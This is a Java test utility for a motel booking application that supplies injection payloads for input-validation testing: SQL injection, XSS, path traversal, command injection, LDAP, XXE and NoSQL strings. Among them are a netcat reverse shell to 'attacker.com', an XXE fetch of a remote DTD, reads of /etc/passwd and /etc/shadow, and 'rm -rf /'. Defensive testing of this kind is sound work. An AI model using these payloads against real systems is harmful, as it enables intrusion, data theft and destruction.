package com.westbethel.motel_booking.security.util;

import java.util.Arrays;
import java.util.List;

/**
 * Provides common injection attack payloads for security testing.
 */
public class InjectionPayloadProvider {

    /**
     * SQL injection payloads for testing input validation.
     */
    public static List<String> getSqlInjectionPayloads() {
        return Arrays.asList(
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1' AND '1'='1",
            "' OR 'x'='x",
            "1; DELETE FROM users",
            "' OR 1=1#",
            "admin' OR '1'='1'/*",
            "') OR ('1'='1",
            "'; EXEC xp_cmdshell('dir')--",
            "1' UNION SELECT username, password FROM users--",
            "' AND 1=(SELECT COUNT(*) FROM users)--",
            "'; WAITFOR DELAY '00:00:05'--"
        );
    }

    /**
     * XSS (Cross-Site Scripting) payloads for testing.
     */
    public static List<String> getXssPayloads() {
        return Arrays.asList(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "<div style=\"background:url('javascript:alert(1)')\">",
            "';alert(String.fromCharCode(88,83,83))//'"
        );
    }

    /**
     * Path traversal payloads for testing.
     */
    public static List<String> getPathTraversalPayloads() {
        return Arrays.asList(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "../../../../../../etc/passwd%00",
            "....\\\\....\\\\....\\\\windows\\\\system32",
            "..//../..//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        );
    }

    /**
     * Command injection payloads for testing.
     */
    public static List<String> getCommandInjectionPayloads() {
        return Arrays.asList(
            "; ls -la",
            "| cat /etc/passwd",
            "& dir",
            "`whoami`",
            "$(whoami)",
            "; rm -rf /",
            "|| cat /etc/shadow",
            "&& ping -c 10 127.0.0.1",
            "; shutdown -h now",
            "| nc -e /bin/sh attacker.com 4444"
        );
    }

    /**
     * LDAP injection payloads for testing.
     */
    public static List<String> getLdapInjectionPayloads() {
        return Arrays.asList(
            "*",
            "*)(&",
            "*)(uid=*",
            "admin)(&(password=*))",
            "*)((|",
            "*)(|(uid=*",
            "admin)(|(password=*))(&"
        );
    }

    /**
     * XML injection payloads for testing.
     */
    public static List<String> getXmlInjectionPayloads() {
        return Arrays.asList(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><foo>&xxe;</foo>",
            "<user><name>admin</name><role>user</role></user><!--<role>admin</role>-->",
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><lolz>&lol2;</lolz>"
        );
    }

    /**
     * JSON injection payloads for testing.
     */
    public static List<String> getJsonInjectionPayloads() {
        return Arrays.asList(
            "{\"user\":\"admin\",\"role\":\"admin\"}",
            "\",\"role\":\"admin\",\"x\":\"",
            "\\\"role\\\":\\\"admin\\\"",
            "{\"$ne\":null}",
            "{\"username\":{\"$gt\":\"\"}}",
            "{'$where':'sleep(1000)'}",
            "\\\",\\\"role\\\":\\\"admin\\\",\\\""
        );
    }

    /**
     * Invalid UUID payloads for testing.
     */
    public static List<String> getInvalidUuidPayloads() {
        return Arrays.asList(
            "not-a-uuid",
            "12345678-1234-1234-1234-12345678901",  // Too short
            "12345678-1234-1234-1234-1234567890123", // Too long
            "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",  // Invalid characters
            "12345678-12-1234-1234-123456789012",    // Wrong format
            "'; DROP TABLE bookings--",              // SQL injection
            "../../../etc/passwd",                    // Path traversal
            "<script>alert('xss')</script>",         // XSS
            ""                                        // Empty string
        );
    }

    /**
     * Invalid email payloads for testing.
     */
    public static List<String> getInvalidEmailPayloads() {
        return Arrays.asList(
            "not-an-email",
            "@example.com",
            "user@",
            "user name@example.com",
            "user@example",
            "user@.com",
            "user..name@example.com",
            "user@example..com",
            "user<script>@example.com",
            "user'; DROP TABLE users--@example.com",
            "user@example.com; DELETE FROM users--",
            "\"<script>alert('xss')</script>\"@example.com"
        );
    }

    /**
     * Invalid phone number payloads for testing.
     */
    public static List<String> getInvalidPhonePayloads() {
        return Arrays.asList(
            "not-a-phone",
            "123",  // Too short
            "12345678901234567890",  // Too long
            "'; DROP TABLE users--",
            "<script>alert('xss')</script>",
            "1234567890; rm -rf /",
            "+1-234-567-890",  // Too short
            "phone number",     // Contains letters
            "1-800-FLOWERS",    // Contains letters
            "++1234567890"      // Multiple + signs
        );
    }

    /**
     * Invalid currency code payloads for testing.
     */
    public static List<String> getInvalidCurrencyPayloads() {
        return Arrays.asList(
            "XXX",  // Not a supported currency
            "US",   // Too short
            "USDD", // Too long
            "'; DROP TABLE--",
            "<script>",
            "US$",
            "EUR1",
            "us$",
            "BTC",  // Cryptocurrency not supported
            "JPY"   // Not in supported list
        );
    }

    /**
     * Boundary value payloads for numeric testing.
     */
    public static class NumericBoundaries {
        public static List<Integer> getIntegerBoundaries() {
            return Arrays.asList(
                Integer.MIN_VALUE,
                Integer.MAX_VALUE,
                -1,
                0,
                1,
                999999999
            );
        }

        public static List<String> getDecimalBoundaries() {
            return Arrays.asList(
                "-999999.99",
                "0.00",
                "0.01",
                "999999.99",
                "1000000.00",  // Exceeds max
                "-0.01",        // Negative
                "0.001",        // Too many decimals
                "9999999.99"    // Too many integer digits
            );
        }
    }

    /**
     * Large payload for overflow testing.
     */
    public static String getLargePayload(int size) {
        return "A".repeat(size);
    }

    /**
     * Null byte injection payloads.
     */
    public static List<String> getNullBytePayloads() {
        return Arrays.asList(
            "normal\u0000injected",
            "file.txt\u0000.exe",
            "user\u0000admin"
        );
    }

    /**
     * Get all injection payloads for comprehensive testing.
     */
    public static List<String> getAllInjectionPayloads() {
        List<String> all = new java.util.ArrayList<>();
        all.addAll(getSqlInjectionPayloads());
        all.addAll(getXssPayloads());
        all.addAll(getPathTraversalPayloads());
        all.addAll(getCommandInjectionPayloads());
        all.addAll(getLdapInjectionPayloads());
        all.addAll(getJsonInjectionPayloads());
        return all;
    }
}
